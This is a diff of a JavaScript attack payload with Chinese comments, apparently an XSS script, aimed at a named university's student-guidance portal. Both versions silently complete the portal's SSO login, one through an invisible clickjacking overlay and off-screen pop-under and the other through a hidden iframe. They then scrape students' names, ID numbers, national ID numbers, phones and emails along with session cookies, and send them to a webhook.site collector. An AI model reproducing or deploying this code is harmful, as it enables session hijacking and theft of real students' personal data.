@@ -1,135 +1,73 @@
 (async () => {
-    // === 設定 ===
-    const webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
-    const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
-    // 假設這是相對於 iframe 當前域名的路徑
-    const targetUrl = "/GuidanceApp/Guidance_StudentDataStdtCtrl?Action=Page1BI";
-
-    // === 工具函數 ===
+    const webhook = "https://webhook.site/27f621f1-be96-441d-b9d6-41fa8f6f788e";
     
-    // 1. CORS 繞過日誌記錄器 (射後不理)
-    // 使用 Image 物件發送 GET 請求，不會觸發 CORS 阻擋
-    const log = (msg) => {
-        try {
-            new Image().src = `${webhook}?log=${encodeURIComponent(msg)}&t=${Date.now()}`;
-        } catch(e) {}
-    };
+    // 1. 觸發點：這是 iportal 的 SSO 入口
+    // 瀏覽器會自動帶上 iportal 的 cookie，並滿足 Referer 要求
+    const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
 
-    // 2. 數據外傳器
-    // 使用 no-cors 模式的 fetch 發送 JSON 數據
-    const exfiltrate = (data) => {
-        try {
-            const payload = JSON.stringify(data);
-            // 優先使用 navigator.sendBeacon (更可靠)
-            if (navigator.sendBeacon) {
-                const blob = new Blob([payload], {type: 'text/plain'});
-                navigator.sendBeacon(webhook, blob);
-            } else {
-                // 回退方案
-                fetch(webhook, {
-                    method: 'POST',
-                    mode: 'no-cors', // 關鍵：忽略跨域回應
-                    headers: {'Content-Type': 'text/plain'}, // 避免觸發 Preflight
-                    body: payload
-                });
-            }
-            log("Exfiltration_Sent");
-        } catch (e) {
-            log("Exfil_Error_" + e.message);
-        }
-    };
+    try {
+        // 創建隱藏 Iframe
+        const ifr = document.createElement('iframe');
+        ifr.style.display = 'none';
+        ifr.src = ssoUrl;
+        document.body.appendChild(ifr);
 
-    // === 攻擊流程 ===
+        fetch(webhook + "?msg=Step1_Iframe_Created");
 
-    async function executeAttack() {
-        log("Script_Started");
+        // 2. 輪詢監控 (Polling)
+        // 我們每隔 1 秒檢查一次 iframe 的狀態
+        let checkCount = 0;
+        const maxChecks = 20; // 最多等 20 秒
 
-        // 步驟 1: 建立隱形覆蓋層 (點擊劫持)
-        const overlay = document.createElement('div');
-        overlay.style.cssText = `
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: rgba(0,0,0,0); 
-            z-index: 2147483647; /* 最大整數值 */
-            cursor: default;
-        `;
-        overlay.id = 'security_check_overlay'; // 取個無害的 ID
-        document.body.appendChild(overlay);
-        
-        log("Overlay_Deployed_Waiting_For_Click");
-
-        // 步驟 2: 定義觸發器 (一次性事件)
-        const clickHandler = async (event) => {
-            // 立即移除覆蓋層，讓使用者之後能正常操作
-            overlay.remove();
-            
-            log("User_Clicked_Initiating_Auth");
-
-            // 步驟 3: 觸發 SSO 彈窗 (Pop-under)
-            // 嘗試將視窗開在螢幕外
-            const popup = window.open(ssoUrl, "sso_auth_window", "width=100,height=100,left=-1000,top=-1000");
-            
-            if (popup) {
-                // 嘗試讓彈窗失焦，主視窗聚焦
-                try { popup.blur(); window.focus(); } catch(e) {}
+        const timer = setInterval(() => {
+            checkCount++;
+            try {
+                // 嘗試讀取 iframe 網址
+                // 如果還在 iportal2 (跨域)，這裡會報錯 (SecurityError)
+                // 如果跳轉回 ap.itc (同源)，這裡會成功！
+                const currentUrl = ifr.contentWindow.location.href;
                 
-                // 等待 5 秒讓 SSO 重定向流程跑完
-                await new Promise(r => setTimeout(r, 5000));
-                
-                // 關閉彈窗
-                try { popup.close(); } catch(e) {}
-                log("Popup_Closed_Fetching_Data");
+                // 如果能讀到 URL，說明已經回到同源了！
+                fetch(webhook + "?msg=Step2_SameOrigin_Detected&url=" + encodeURIComponent(currentUrl));
 
-                // 步驟 4: 獲取受害者數據
-                try {
-                    const response = await fetch(targetUrl);
-                    const text = await response.text();
+                // 檢查是否已經是登入後的頁面 (StdtLoginCtrl)
+                if (currentUrl.includes("StdtLoginCtrl") || currentUrl.includes("GuidanceApp")) {
+                    // 3. 收割數據
+                    // 直接讀取 iframe 內部的 HTML，這就是那張包含個資的頁面
+                    const pageHtml = ifr.contentWindow.document.body.innerHTML;
+                    const cookies = document.cookie; // 順便拿新的 Session ID
 
-                    // 步驟 5: 解析數據
-                    let info = {};
-                    try {
-                        const clean = (str) => str ? str.replace(/<[^>]+>/g, '').trim() : "N/A";
-                        // 使用正則抓取標籤後的內容
-                        info.studentId = clean(text.match(/學生學號:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
-                        info.name = clean(text.match(/學生姓名:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
-                        info.idCard = clean(text.match(/身分證字號:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
-                        info.phone = clean(text.match(/手機:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
-                        info.email = clean(text.match(/E-mail:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
-                    } catch (parseErr) {
-                        log("Parse_Error");
-                    }
+                    // 簡單提取姓名做驗證
+                    let name = pageHtml.match(/學生姓名:.*?form-control-static">([^<&]+)/)?.[1]?.trim() || "Unknown";
 
-                    // 步驟 6: 回傳數據
-                    exfiltrate({
-                        status: "SUCCESS",
-                        data: info,
-                        cookie: document.cookie,
-                        // 可選：回傳部分 HTML 以供調試 (前 1000 字)
-                        partial_source: text.substring(0, 1000) 
+                    fetch(webhook, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify({
+                            msg: "SUCCESS_LOOT_SECURED",
+                            victim_name: name,
+                            final_url: currentUrl,
+                            html_content: pageHtml.substring(0, 5000), // 截取前 5000 字
+                            cookies: cookies
+                        })
                     });
 
-                } catch (fetchErr) {
-                    log("Fetch_Error_" + fetchErr.message);
+                    // 任務完成，清除定時器
+                    clearInterval(timer);
+                    // document.body.removeChild(ifr); // 可選：清理 iframe
                 }
 
-            } else {
-                log("Popup_Blocked");
+            } catch (e) {
+                // 如果報錯，說明還在 iportal2 (跨域中)，繼續等待...
+                // console.log("Waiting for redirect...", e.message);
+                if (checkCount >= maxChecks) {
+                    clearInterval(timer);
+                    fetch(webhook + "?error=Timeout_Waiting_For_Redirect");
+                }
             }
-        };
+        }, 1000); // 每秒檢查一次
 
-        // 將監聽器綁定到覆蓋層
-        overlay.addEventListener('click', clickHandler, { once: true });
+    } catch (e) {
+        fetch(webhook + "?error=" + encodeURIComponent(e.message));
     }
-
-    // 執行
-    try {
-        executeAttack();
-    } catch(e) {
-        // 最後一道防線的錯誤回報
-        new Image().src = webhook + "?fatal_error=" + encodeURIComponent(e.message);
-    }
-
 })();
